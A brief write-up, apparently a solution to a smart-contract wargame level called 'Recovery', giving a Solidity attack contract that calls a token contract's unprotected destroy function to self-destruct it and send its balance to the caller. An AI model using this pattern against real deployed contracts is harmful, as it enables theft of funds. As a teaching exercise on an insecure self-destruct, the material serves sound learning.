# Recovery

Step1:

Take instance address to etherscan and locate new contract address.

Step2: Write some code!

```// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './SimpleToken.sol';

contract RecoveryAttack {
    SimpleToken instance = SimpleToken(0x4D4214f8EF272468Eb16d49737bEE6308c94cf60);

    function attack() external {
        instance.destroy(payable(msg.sender));
    }

}
```
Step3: Resolve import issues and deploy

Step4: Call attack function -> Notice it grabs the instance of SimpleToken and calls self destruct which inturns forces contract value into `msg.sender` wallet.